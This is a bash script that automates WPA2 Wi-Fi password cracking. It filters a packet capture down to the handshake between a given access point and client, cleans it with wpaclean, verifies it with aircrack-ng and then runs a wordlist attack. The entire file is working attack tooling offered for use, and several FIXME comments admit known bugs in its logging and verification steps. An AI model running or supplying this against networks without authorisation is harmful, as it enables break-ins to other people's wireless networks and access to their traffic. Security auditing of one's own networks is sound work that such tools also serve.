#!/bin/bash
# wpa2-crack.sh - A script to automate WPA2 handshake extraction and cracking.
#
# This script:
#   1. Generates a Wireshark filter based on the AP BSSID and Client MAC.
#   2. Applies the filter to a raw pcap file using tshark.
#   3. Cleans the filtered capture with wpaclean.
#   4. Verifies the handshake with aircrack-ng.
#   5. Optionally cracks the handshake using aircrack-ng with a provided wordlist.
#
# Usage:
#   ./wpa2-crack.sh -b <AP_BSSID> -c <CLIENT_MAC> -w <wordlist.txt> -i <raw_capture.pcap> [--skip-filtering] [-s] [-l]
#
# Options:
#   -b | --bssid        : The BSSID of the Access Point (e.g., 00:14:22:01:23:45)
#   -c | --client       : The Client MAC (e.g., 12:34:56:78:9a:bc)
#   -w | --wordlist     : Path to the wordlist file (e.g., wordlist.txt)
#   -i | --input        : Path to the raw pcap file (e.g., raw_capture.pcap)
#   --skip-filtering    : Skip filtering step if the input pcap is already prepared
#   -s | --save         : Save all output files (filters.txt, filtered_capture.pcap, cleaned_handshake.pcap) in a directory
#   -l | --log          : Enable logging to a log file
#   -h | --help         : Display usage information

# Global variables
AP_BSSID=""
CLIENT_MAC=""
WORDLIST=""
INPUT_PCAP=""

FILTER=""
LOGFILE=""
SAVE_DIR=""

SAVE_FILTER=false
SKIP_FILTERING=false
LOGGING_ENABLED=false

FILTER_FILE="filters.txt"
FILTERED_PCAP="filtered_capture.pcap"
CLEANED_PCAP="cleaned_handshake.pcap"

# Define ANSI escape codes for colors and formatting
BOLD="\033[1m"
ITALIC="\033[3m"
CYAN="\033[36m"
GREEN="\033[32m"
RED="\033[31m"
YELLOW="\033[33m"
UNDERLINE="\033[4m"
RESET="\033[0m"

################################
# FIXME: update all log messages
################################

# Log function to append messages with timestamp (only if logging is enabled)
log() {
    if [ "$LOGGING_ENABLED" = true ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"
    fi
}

# Print function for user-facing messages
print() {
    echo -e "$1${RESET}"
}

# Function to display usage instructions
usage() {
    cat <<EOF
Usage: $0 -b <AP_BSSID> -c <CLIENT_MAC> -w <wordlist.txt> -i <raw_capture.pcap> [--skip-filtering] [-s] [-l]

Options:
  -b, --bssid        The BSSID of the Access Point (e.g., 00:14:22:01:23:45)
  -c, --client       The Client MAC (e.g., 12:34:56:78:9a:bc)
  -w, --wordlist     Path to the wordlist file (e.g., wordlist.txt)
  -i, --input        Path to the raw capture pcap file (e.g., raw_capture.pcap)
  --skip-filtering   Skip filtering step if the input pcap is already prepared
  -s, --save         Save all output files (filters.txt, filtered_capture.pcap, cleaned_handshake.pcap) in a directory
  -l, --log          Enable logging to a log file
  -h, --help         Display this help message
EOF
    exit 1
}

# Function to parse command-line arguments
parse_args() {
    if [ "$#" -eq 0 ]; then
        usage
    fi

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -b|--bssid)
                AP_BSSID="$2"
                shift 2
                ;;
            -c|--client)
                CLIENT_MAC="$2"
                shift 2
                ;;
            -w|--wordlist)
                WORDLIST="$2"
                shift 2
                ;;
            -i|--input)
                INPUT_PCAP="$2"
                shift 2
                ;;
            --skip-filtering)
                SKIP_FILTERING=true
                shift
                ;;
            -s|--save)
                SAVE_FILTER=true
                shift
                ;;
            -l|--log)
                LOGGING_ENABLED=true
                LOGFILE="wpa2_crack_$(date '+%Y%m%d_%H%M%S').log"
                shift
                ;;
            -h|--help)
                usage
                ;;
            *)
                echo "Unknown parameter: $1"
                usage
                ;;
        esac
    done

    # Check required parameters
    if [[ -z "$AP_BSSID" || -z "$CLIENT_MAC" || -z "$WORDLIST" || -z "$INPUT_PCAP" ]]; then
        echo "Error: Missing required parameters."
        usage
    fi
}

# Function to print the title/logo
print_logo() {
    print ""
    print "${BOLD}================================================================================${RESET}"
    print "${BOLD}                              WPA2 CRACKING SCRIPT                              ${RESET}"
    print "${BOLD}${ITALIC}              Automated Handshake Extraction and Password Crack        ${RESET}"
    print "${BOLD}================================================================================${RESET}"
}

# Function to print the parameters
print_parameters() {
    print ""
    print "Starting the process with the following parameters:"
    print "${BOLD}- BSSID:${RESET} ${CYAN}$AP_BSSID${RESET}"
    print "${BOLD}- Client MAC:${RESET} ${CYAN}$CLIENT_MAC${RESET}"
    print "${BOLD}- Wordlist:${RESET} ${CYAN}$WORDLIST${RESET}"
    print "${BOLD}- Input File:${RESET} ${CYAN}$INPUT_PCAP${RESET}"
}

# Function to print a delimiter
print_delimiter() {
    print ""     
    print "================================================================================"
}

# Function to create the save directory if the -s flag is used
create_save_directory() {
    if [ "$SAVE_FILTER" = true ]; then
        SAVE_DIR="wpa2_cracking_$(date '+%Y%m%d_%H%M%S')"
        mkdir -p "$SAVE_DIR"
        log "Created save directory: $SAVE_DIR"
        
        # Move the log file to the save directory if logging is enabled
        if [ "$LOGGING_ENABLED" = true ]; then
            mv "$LOGFILE" "$SAVE_DIR/"
            LOGFILE="$SAVE_DIR/$(basename "$LOGFILE")"  # Update the log file path
            log "Log file moved to $SAVE_DIR/"
        fi
    fi
}

# Function to generate Wireshark filter
generate_filter() {
    FILTER="(wlan.fc.type == 0 && wlan.bssid == $AP_BSSID) || 
(wlan.fc.type_subtype == 0x08 && wlan.bssid == $AP_BSSID) || 
(wlan.fc.type_subtype == 0x05 && wlan.sa == $AP_BSSID) || 
(wlan.fc.type_subtype == 0x00 && wlan.sa == $CLIENT_MAC) || 
(wlan.fc.type_subtype == 0x01 && wlan.sa == $CLIENT_MAC) || 
(eapol && (wlan.sa == $AP_BSSID || wlan.sa == $CLIENT_MAC))"
    
    log "Generated filter: $FILTER"
    print "${BOLD}\nWireshark filter generated successfully.${RESET}"
    
    if [ "$SAVE_FILTER" = true ]; then
        echo "$FILTER" > "$SAVE_DIR/$FILTER_FILE"
        log "Filter saved to $SAVE_DIR/$FILTER_FILE"
    fi
}

# Function to filter the raw capture using tshark
filter_capture() {
    print "\nFiltering the raw capture file to extract relevant packets..."
    log "Applying filter to input pcap: $INPUT_PCAP"
    
    tshark -r "$INPUT_PCAP" -Y "$FILTER" -w "$FILTERED_PCAP" -F pcap
    if [ $? -eq 0 ]; then
        log "Filtered capture saved as $FILTERED_PCAP"
        if [ "$SAVE_FILTER" = true ]; then
            mv "$FILTERED_PCAP" "$SAVE_DIR/"
            FILTERED_PCAP="$SAVE_DIR/filtered_capture.pcap"  # Update the path if saved
            log "Filtered capture moved to $SAVE_DIR/"
        fi
    else
        log "Error: tshark failed to filter the capture."
        print "${RED}An error occurred while filtering the capture file. Please check the log file for details.${RESET}"
        exit 1
    fi
}

# Function to clean the filtered capture using wpaclean
clean_capture() {
    print "${GREEN}\nCleaning the filtered capture file to prepare it for handshake verification...${RESET}"
    log "Cleaning capture file: $CLEANED_INPUT"
    
    wpaclean "$CLEANED_PCAP" "$CLEANED_INPUT"
    if [ $? -eq 0 ] && [ -f "$CLEANED_PCAP" ]; then
        log "Cleaned capture saved as $CLEANED_PCAP"
        if [ "$SAVE_FILTER" = true ]; then
            mv "$CLEANED_PCAP" "$SAVE_DIR/"
            CLEANED_PCAP="$SAVE_DIR/cleaned_handshake.pcap"  # Update the path if saved
            log "Cleaned capture moved to $SAVE_DIR/"
        fi
    else
        log "Error: wpaclean failed or did not produce a valid cleaned file."
        print "${RED}An error occurred while cleaning the capture file. Please check the log file for details.${RESET}"
        exit 1
    fi
}

# Function to check if the handshake is present using aircrack-ng
check_handshake() {
    if [ ! -f "$CLEANED_PCAP" ]; then
        log "Error: Cleaned handshake file $CLEANED_PCAP not found."
        print "${RED}The cleaned handshake file could not be found. Please ensure the cleaning step was successful.${RESET}"
        exit 1
    fi
    
    print "${GREEN}\nVerifying the handshake in the cleaned capture file...${RESET}"
    log "Checking for handshake in $CLEANED_PCAP"
    aircrack-ng -a2 -b "$AP_BSSID" "$CLEANED_PCAP" | tee -a "$LOGFILE" # FIXME -> Pre-condition Failed: ap_cur != NULL | (when -l flag is used)
                                                                       #       -> tee: : No such file or directory, Pre-condition Failed: ap_cur != NULL | (when -l flag is not used)
    print "${BOLD}${GREEN}\nHandshake verification complete.${RESET}"
    print "${ITALIC}Please review the output above to confirm if a valid handshake was found.${RESET}"
}

# Function to start cracking using aircrack-ng with the provided wordlist
crack_handshake() {
    print "${GREEN}\nStarting the password cracking process.${RESET}"
    print "${ITALIC}This may take some time depending on the size of your wordlist...${RESET}\n"
    log "Starting cracking process using wordlist: $WORDLIST"
    aircrack-ng -w "$WORDLIST" -b "$AP_BSSID" "$CLEANED_PCAP" | tee -a "$LOGFILE" # FIXME -> tee: : No such file or directory | (when -l flag is not used)
    print "${BOLD}${GREEN}Password cracking process complete.${RESET}"
    print "${ITALIC}Please review the output above for the results.${RESET}"
}

# Main function that calls all the steps
main() {
    parse_args "$@"

    print_logo
    print_parameters
    print_delimiter

    if [ "$SAVE_FILTER" = true ]; then
        create_save_directory
    fi

    generate_filter

    if [ "$SKIP_FILTERING" = false ]; then
        filter_capture
        CLEANED_INPUT="${SAVE_DIR:-.}/filtered_capture.pcap"  # Use save directory if -s is active, otherwise current directory
    else
        print "${YELLOW}Skipping the filtering step as requested. Using the provided input file directly.${RESET}"
        CLEANED_INPUT="$INPUT_PCAP"
    fi

    clean_capture
    check_handshake

    echo -e ""
    read -p "$(print "${BOLD}${UNDERLINE}Do you want to start the password cracking process? (y/N):${RESET}") " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        crack_handshake
    else
        print "${RED}\nExiting without starting the password cracking process. Goodbye!${RESET}"
        log "User chose not to start the cracking process."
    fi

    # Remove temporary files if the save flag is not active
    if [ "$SAVE_FILTER" = false ]; then
        print "\nCleaning up temporary files..."
        rm -f $FILTERED_PCAP $CLEANED_PCAP
        log "Temporary files removed as -s flag is not active."
        print "Temporary files have been removed."
    fi
}

# Start the script
main "$@"
